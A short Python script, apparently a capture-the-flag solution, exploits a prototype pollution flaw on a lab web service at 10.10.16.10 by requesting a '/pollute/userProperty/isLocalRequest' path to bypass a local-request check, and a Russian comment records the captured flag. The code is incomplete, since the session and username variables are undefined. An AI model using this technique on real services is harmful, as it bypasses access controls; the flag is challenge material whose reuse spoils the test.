import requests

url="10.10.16.10:3000"

s.get(f"{url}/pollute/userProperty/isLocalRequest")
s.get(f"{url}/auth?username={testoviy_username}")
print(s.get(f"{url}/pollute/userProperty/isLocalRequest").content)

#Мы получили флаг: nto{pr0t0typ3_pollut10n_g4dged5_f56acc00f5eb803de88496b}
